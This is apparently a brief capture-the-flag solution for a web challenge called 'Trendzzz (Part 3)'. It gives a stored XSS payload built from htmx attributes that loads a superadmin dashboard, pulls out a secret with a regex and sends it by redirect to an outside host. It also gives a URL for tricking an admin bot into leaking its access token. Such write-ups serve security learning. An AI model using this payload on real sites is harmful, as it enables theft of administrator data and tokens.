## Trendzzz (Part 3)

1. Trigger XSS using htmx
2. Add payload as post

   > `<p id="x" hx-get="/superadmin/dashboard" hx-trigger="load" hx-target="#x"></p><p hx-get="/getAccessToken" hx-trigger="load delay:1s" hx-vals='js:{redirect:"http://domain?a="+x.innerHTML.match(/csc.*}/)}'></p>`

3. Submit it to bot make sure to redirect so you can get access token too.
   > `https://<Domain>/getAccessToken?redirect=/superadmin/viewpost/<post-id>`
